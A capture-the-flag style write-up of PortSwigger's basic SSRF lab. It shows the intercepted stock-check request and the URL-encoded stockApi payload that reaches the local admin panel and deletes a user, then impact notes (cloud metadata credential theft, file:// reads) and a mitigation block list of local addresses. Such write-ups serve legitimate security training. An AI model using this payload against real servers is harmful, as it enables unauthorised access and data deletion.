# Basic SSRF against the local server

**Source:** [PortSwigger](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)  
**Category:** SSRF  
**Difficulty:** Apprentice

## Objective
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

## Vulnerability
This lab has a stock check feature which fetches data from an internal system.

## Exploitation

### Steps
1. Entering the lab, entering a product and intercepting the stock check request, the following request is found there:
    ```text
    POST /product/stock HTTP/2
    Host: 0a780002043fd06880f458ed006e00f1.web-security-academy.net
    [...]
    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    ```

2. Changing `stockApi` to `http%3A%2F%2Flocalhost%2Fadmin` opened the admin panel, open the request in the browser and click to delete the user, a page with a security check popped up but the browser then has the url `/admin/delete?username=carlos`

3. Go back to the request and send it with `stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos`, the response is 302 Found and the user was deleted.

### Payload
```stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos```

### Shortcut
1. Intercept the product stock request and send it to Repeater.
2. Replace `stockApi` with `http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos` and send the request.

## Impact
An attacker could force the server to make requests to internal resources not accessible from the outside, such as `localhost`, internal services, or cloud metadata endpoints. Here it allows access to the admin panel without authentication and deleting the user `carlos`. In a broader scenario SSRF can lead to internal network scanning, reading local files via `file://`, stealing cloud metadata credentials (`169.254.169.254`), and chained with other bugs even RCE.

## Mitigation
- Whitelist allowed hosts/domains for any URL-fetching parameter (e.g. only `stock.weliketoshop.net`).
- Block private and local addresses (`127.0.0.1`, `localhost`, `169.254.0.0/16`, `10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`), including bypasses like `127.1`, `0.0.0.0`, decimal/hex IPs.
- Enforce auth on internal endpoints instead of relying on them being reachable only from `localhost`.
- Use a separate, isolated service for fetching external resources.
- Do not pass raw user-supplied URLs — use server-side identifiers mapped to allowed destinations.
- Disable unnecessary URL schemes (`file://`, `gopher://`, `dict://`).

## Tools
- Burp Suite
- Repeater

## Notes
- SSRF works because the server makes the request on behalf of the user and trusts the source, including `localhost`.
- Internal-only endpoints like `/admin` often lack auth because it is assumed only admins can reach them.
- URL encoding matters (`%3A` = `:`, `%2F` = `/`, `%3F` = `?`, `%3D` = `=`).
- `302 Found` indicates the delete action succeeded.
- SSRF is often the first step for pivoting deeper into an internal network.